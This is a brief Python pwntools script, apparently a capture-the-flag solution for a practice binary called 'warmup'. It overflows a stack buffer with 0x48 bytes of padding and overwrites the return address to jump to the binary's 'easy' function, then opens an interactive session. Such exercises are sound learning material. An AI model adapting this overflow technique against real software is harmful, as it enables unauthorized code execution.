#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./warmup")
p = process(elf.path)

payload = b"A" * 0x48
payload += p64(elf.symbols["easy"])

p.sendline(payload)
p.interactive()
